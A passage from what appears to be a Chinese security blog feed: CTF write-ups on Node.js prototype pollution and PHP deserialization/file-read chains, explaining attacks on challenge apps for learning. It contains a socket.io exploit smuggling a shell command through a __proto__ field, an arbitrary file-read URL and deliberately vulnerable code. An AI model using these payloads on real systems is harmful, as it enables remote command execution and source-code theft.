js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (&#123;&#125;.test == <span class="string">"123"</span> || &#123;&#125;.test == <span class="number">123</span>) &#123;</span><br><span class="line"><span class="keyword">delete</span> <span class="built_in">Object</span>.prototype.test;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>作者经过测试，得到了许多受原型链污染影响的库：<br><img src="/images/2019-12-07-11-18-38.png" alt=""><br>其中不乏我们经常在ctf中遇到的lodash……<br><img src="/images/2019-12-07-11-19-10.png" alt=""><br>而后，作者选取了几个典例进行分析。</p><h3 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h3><p>例如代码中的第12行，存在漏洞点，其使用了lodash的merge，导致我们可以污染req对象，由于返回结果依赖于这个对象。那么如果攻击者input如下exp，每一条请求都将返回500：<br><img src="/images/2019-12-07-11-20-11.png" alt=""></p><h3 id="For-loop污染"><a href="#For-loop污染" class="headerlink" title="For-loop污染"></a>For-loop污染</h3><p>例如如下代码，我们可以进行原型污染，这样commands在下一次遍历时，就会遍历到我们加入的恶意值，进行任意命令执行。<br><img src="/images/2019-12-07-11-20-29.png" alt=""></p><h3 id="Property-injection"><a href="#Property-injection" class="headerlink" title="Property injection"></a>Property injection</h3><p>由于NodeJS的http模块拥有多个同名header，我们可以对cookie进行污染，那么request.headers.cookie将变为我们的污染值，那么每一个访问者都会共享同一个cookie：<br><img src="/images/2019-12-07-11-20-58.png" alt=""></p><h2 id="CTF中的应用"><a href="#CTF中的应用" class="headerlink" title="CTF中的应用"></a>CTF中的应用</h2><p>看完了作者介绍的原型链污染攻击，我们来看一下其在CTF中的简单应用。<br>题目： <a href="https://chat.dctfq18.def.camp" target="_blank" rel="noopener">https://chat.dctfq18.def.camp</a><br>源码：<a href="https://dctf.def.camp/dctf-18-quals-81249812/chat.zip" target="_blank" rel="noopener">https://dctf.def.camp/dctf-18-quals-81249812/chat.zip</a><br>我们下载源码后，首先审计服务端代码：<br>看到在help.js中有如下高危代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getAscii: <span class="function"><span class="keyword">function</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line">    <span class="keyword">return</span> e.execSync(<span class="string">"cowsay '"</span> + message + <span class="string">"'"</span>).toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果我们可控message，那么即可进行rce，例如：<br><img src="/images/2019-12-07-22-25-40.png" alt=""><br>于是在server.js中寻找调用点：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">client.on(<span class="string">'join'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">channel</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        clientManager.joinChannel(client, channel);</span><br><span class="line">        sendMessageToClient(client,<span class="string">"Server"</span>, </span><br><span class="line">            <span class="string">"You joined channel"</span>, channel)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> u = clientManager.getUsername(client);</span><br><span class="line">        <span class="keyword">var</span> c = clientManager.getCountry(client);</span><br><span class="line"></span><br><span class="line">        sendMessageToChannel(channel,<span class="string">"Server"</span>, </span><br><span class="line">            helper.getAscii(<span class="string">"User "</span> + u + <span class="string">" living in "</span> + c + <span class="string">" joined channel"</span>))</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123; <span class="built_in">console</span>.log(e); client.disconnect() &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">client.on(<span class="string">'leave'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">channel</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        client .join(channel);</span><br><span class="line">        clientManager.leaveChannel(client, channel);</span><br><span class="line">        sendMessageToClient(client,<span class="string">"Server"</span>, </span><br><span class="line">            <span class="string">"You left channel"</span>, channel)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> u = clientManager.getUsername(client);</span><br><span class="line">        <span class="keyword">var</span> c = clientManager.getCountry(client);</span><br><span class="line">        sendMessageToChannel(channel, <span class="string">"Server"</span>, </span><br><span class="line">            helper.getAscii(<span class="string">"User "</span> + u + <span class="string">" living in "</span> + c + <span class="string">" left channel"</span>))</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123; <span class="built_in">console</span>.log(e); client.disconnect() &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>可以发现在join和leave用相应的调用：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> u = clientManager.getUsername(client);</span><br><span class="line"><span class="keyword">var</span> c = clientManager.getCountry(client);</span><br><span class="line"></span><br><span class="line">sendMessageToChannel(channel,<span class="string">"Server"</span>, </span><br><span class="line">    helper.getAscii(<span class="string">"User "</span> + u + <span class="string">" living in "</span> + c + <span class="string">" joined channel"</span>))</span><br></pre></td></tr></table></figure></p><p>那么如果可控u和c，那么即可进行命令拼接，而u对于name，c对应country，对于name参数：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">validUser: <span class="function"><span class="keyword">function</span>(<span class="params">inp</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> block = [<span class="string">"source"</span>,<span class="string">"port"</span>,<span class="string">"font"</span>,<span class="string">"country"</span>,</span><br><span class="line">                     <span class="string">"location"</span>,<span class="string">"status"</span>,<span class="string">"lastname"</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">typeof</span> inp !== <span class="string">'object'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> keys = <span class="built_in">Object</span>.keys( inp);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i&lt; keys.length; i++) &#123;</span><br><span class="line">            key = keys[i];</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(block.indexOf(key) !== <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> r =<span class="regexp">/^[a-z0-9]+$/gi</span>;</span><br><span class="line">        <span class="keyword">if</span>(inp.name === <span class="literal">undefined</span> || !r.test(inp.name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>我们发现我们被进行了大量过滤，很难直接进行任意命令执行，于是我们开始思考如何改变country的值，那么便容易想到使用原型链污染，在父类对象中加入country属性的值，进行污染。<br>那么我们可以从register进行输入：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">client.on(<span class="string">'register'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">inUser</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           newUser = helper.clone(<span class="built_in">JSON</span>.parse(inUser))</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span>(!helper.validUser(newUser)) &#123;</span><br><span class="line">               sendMessageToClient(client,<span class="string">"Server"</span>, </span><br><span class="line">                   <span class="string">'Invalid settings.'</span>)</span><br><span class="line">               <span class="keyword">return</span> client.disconnect();</span><br><span class="line">           &#125; </span><br><span class="line"></span><br><span class="line">           <span class="keyword">var</span> keys = <span class="built_in">Object</span>.keys(defaultSettings);</span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; keys.length; ++i) &#123;</span><br><span class="line">               <span class="keyword">if</span>(newUser[keys[i]] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">                   newUser[keys[i]] = defaultSettings[keys[i]]</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; </span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (!clientManager.isUserAvailable(newUser.name)) &#123;</span><br><span class="line">               sendMessageToClient(client,<span class="string">"Server"</span>, </span><br><span class="line">                   newUser.name + <span class="string">' is not available'</span>)</span><br><span class="line">               <span class="keyword">return</span> client.disconnect(); </span><br><span class="line">           &#125;</span><br><span class="line">        </span><br><span class="line">           clientManager.registerClient(client, newUser)</span><br><span class="line">           <span class="keyword">return</span> sendMessageToClient(client,<span class="string">"Server"</span>, </span><br><span class="line">               newUser.name + <span class="string">' registered'</span>)</span><br><span class="line">       &#125; <span class="keyword">catch</span>(e) &#123; <span class="built_in">console</span>.log(e); client.disconnect() &#125;</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure></p><p>我们发现存在原型链污染漏洞点：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newUser = helper.clone(<span class="built_in">JSON</span>.parse(inUser))</span><br></pre></td></tr></table></figure></p><p>我们可以利用这里的clone，进行污染，达成目的。<br>构造如下exp：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> io = <span class="built_in">require</span>(<span class="string">'socket.io-client'</span>)</span><br><span class="line"><span class="keyword">const</span> socket = io.connect(<span class="string">'0.0.0.0:10000'</span>)</span><br><span class="line"></span><br><span class="line">socket.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'received socket error:'</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(err)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">socket.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(msg.from,<span class="string">"["</span>, msg.channel!==<span class="literal">undefined</span>?msg.channel:<span class="string">'Default'</span>,<span class="string">"]"</span>, <span class="string">"says:\n"</span>, msg.message);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">socket.emit(<span class="string">'register'</span>, <span class="string">`&#123;"name":"xxx", "__proto__":&#123;"country":"xxx';ls -al;echo 'xxx"&#125;&#125;`</span>);</span><br><span class="line">socket.emit(<span class="string">'message'</span>, <span class="built_in">JSON</span>.stringify(&#123; <span class="attr">msg</span>: <span class="string">"hello"</span> &#125;));</span><br><span class="line">socket.emit(<span class="string">'join'</span>, <span class="string">'xxx'</span>);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-07-22-57-41.png" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>Prototype pollution attack还是一个比较有趣的攻击点，下次可以结合一些题目和CVE再做一些深入的了解。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇paper来自于 NSEC 2018 ：Prototype pollution attack in NodeJS application
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 巅峰极客 Online WriteUp</title>
    <link href="http://skysec.top/2019/10/19/2019-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-Online-WriteUp/"/>
    <id>http://skysec.top/2019/10/19/2019-巅峰极客-Online-WriteUp/</id>
    <published>2019-10-19T02:49:24.000Z</published>
    <updated>2019-10-20T01:17:44.038Z</updated>
    
    <content type="html"><![CDATA[<h2 id="lol"><a href="#lol" class="headerlink" title="lol"></a>lol</h2><p>拿到题目后，发现有一个上传页面：<br><img src="/images/2019-10-19-10-50-10.png" alt=""><br>点进去发现可控参数名较多，但最可疑的还是上传文件位置：<br><img src="/images/2019-10-19-10-50-21.png" alt=""><br>尝试上传一个文件，发现有两个路径，一个是upload，一个是download：<br><img src="/images/2019-10-19-10-51-20.png" alt=""><br>经过测试发现，文件名不是通过filename控制，而是通过phpsessionid控制：<br><img src="/images/2019-10-19-10-51-42.png" alt=""><br>尝试目录穿越，发现upload路径突然变成了绝对路径= =，估计代码哪里出现了问题：<br><img src="/images/2019-10-19-10-52-05.png" alt=""><br>同时访问文件，可以发现文件内容确实有写入：<br><img src="/images/2019-10-19-10-55-46.png" alt=""><br>然后就陷入了沉思，直到题目提示，注意download功能，又经过大量测试发现download功能的下载路径，是拼接了phpsessionid的路径的，于是我们首先创立upload目录：<br><img src="/images/2019-10-20-09-09-58.png" alt=""><br>然后进行任意源码读取：<br><img src="/images/2019-10-20-09-10-02.png" alt=""><br>我们可以通过该方法leak出整个网站的源码。<br>审计源码，发现可疑类：<code>Cache.class.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $data;</span><br><span class="line">    <span class="keyword">public</span> $sj;</span><br><span class="line">    <span class="keyword">public</span> $path;</span><br><span class="line">    <span class="keyword">public</span> $html;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'name'</span>]=<span class="keyword">isset</span>($data[<span class="string">'post'</span>][<span class="string">'name'</span>])?$data[<span class="string">'post'</span>][<span class="string">'name'</span>]:<span class="string">''</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'message'</span>]=<span class="keyword">isset</span>($data[<span class="string">'post'</span>][<span class="string">'message'</span>])?$data[<span class="string">'post'</span>][<span class="string">'message'</span>]:<span class="string">''</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'image'</span>]=!<span class="keyword">empty</span>($data[<span class="string">'image'</span>])?$data[<span class="string">'image'</span>]:<span class="string">'/static/images/pic04.jpg'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;path=Cache_DIR.DS.session_id().<span class="string">'.php'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;html=sprintf(<span class="string">'&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;LOL&lt;/title&gt;&lt;meta charset="utf-8" /&gt;&lt;meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" /&gt;&lt;link rel="stylesheet" href="/static/css/main.css" /&gt;&lt;noscript&gt;&lt;link rel="stylesheet" href="/static/css/noscript.css" /&gt;&lt;/noscript&gt;   &lt;/head&gt; &lt;body class="is-preload"&gt;&lt;div id="wrapper"&gt;&lt;header id="header"&gt; &lt;div class="logo"&gt;&lt;span class="icon fa-diamond"&gt;&lt;/span&gt; &lt;/div&gt;  &lt;div class="content"&gt;&lt;div class="inner"&gt;    &lt;h1&gt;Hero of you&lt;/h1&gt;&lt;/div&gt;  &lt;/div&gt;  &lt;nav&gt;&lt;ul&gt;   &lt;li&gt;&lt;a href="#you"&gt;YOU&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;    &lt;/nav&gt;&lt;/header&gt;&lt;div id="main"&gt;&lt;article id="you"&gt;    &lt;h2 class="major" ng-app&gt;%s&lt;/h2&gt;    &lt;span class="image main"&gt;&lt;img src="%s" alt="" /&gt;&lt;/span&gt; &lt;p&gt;%s&lt;/p&gt;&lt;button type="button" onclick=location.href="/download/%s"&gt;下载&lt;/button&gt;&lt;/article&gt;&lt;/div&gt;&lt;footer id="footer"&gt;&lt;/footer&gt;&lt;/div&gt;&lt;script src="/static/js/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="/static/js/browser.min.js"&gt;&lt;/script&gt;&lt;script src="/static/js/breakpoints.min.js"&gt;&lt;/script&gt;&lt;script src="/static/js/util.js"&gt;&lt;/script&gt;&lt;script src="/static/js/main.js"&gt;&lt;/script&gt;&lt;script src="/static/js/angular.js"&gt;&lt;/script&gt;   &lt;/body&gt;&lt;/html&gt;'</span>,substr(<span class="keyword">$this</span>-&gt;data[<span class="string">'name'</span>],<span class="number">0</span>,<span class="number">62</span>),<span class="keyword">$this</span>-&gt;data[<span class="string">'image'</span>],<span class="keyword">$this</span>-&gt;data[<span class="string">'message'</span>],session_id().<span class="string">'.jpg'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(file_put_contents(<span class="keyword">$this</span>-&gt;path,<span class="keyword">$this</span>-&gt;html))&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现该类有任意文件写的功能，那么思考如何触发反序列化，这里可以用到Jarvis OJ / 2018 LCTF早就考过的考点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/2017/08/16/jarvisoj-web/#PHPINFO</span><br><span class="line">https://skysec.top/2018/11/17/2018-Xctf%20Final&amp;LCTF-Bestphp/#bestphp%E2%80%99s-revenge</span><br></pre></td></tr></table></figure></p><p>利用php session引擎的不同，进行反序列化，达成任意文件写入的目的：<br><img src="/images/2019-10-20-09-10-40.png" alt=""><br>最终可以getflag。</p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>打开题目发现有3个功能：</p><ul><li>文件下载</li><li>文件上传</li><li>查看文件<br>依次打开，发现查看文件存在任意文件读取:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file.php?file=/var/www/html/index.php</span><br></pre></td></tr></table></figure></li></ul><p>通过如上方法拖出所有源码，审计代码，发现文件查看功能使用了类：<br><img src="/images/2019-10-19-14-03-56.png" alt=""><br>那么容易想到phar反序列化，因为file_exists可以触发phar反序列化，于是迅速查找类的定义：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text= <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">        $text = base64_encode(file_get_contents($text));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text= <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">        $text = base64_encode(file_get_contents($text));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|flag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Show(<span class="string">'index.php'</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str-&gt;source = <span class="keyword">$this</span>-&gt;test;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str-&gt;_show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>一般来说，反序列化的入口都可以从<strong>destruct()发起，我们可以看到起调用了一个方法_show()，而这里如果str属性赋值为S6ow的对象，那么就会触发S6ow类的</strong>call魔法方法，而当S6ow调用$name变量(_show)时，又会触发其<strong>get方法，在</strong>get方法中，由于之前访问的不可访问方法，会变为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;params[<span class="string">'_show'</span>];</span><br></pre></td></tr></table></figure></p><p>那么此时，只要给其赋值为file_get，即可利用echo触发show类的__toString魔法方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">params[<span class="string">'_show'</span>] = <span class="string">'file_get'</span></span><br></pre></td></tr></table></figure></p><p>最终在show类的__toString魔法方法完成利用：<br><figure class="highlight php"><table><tr><td 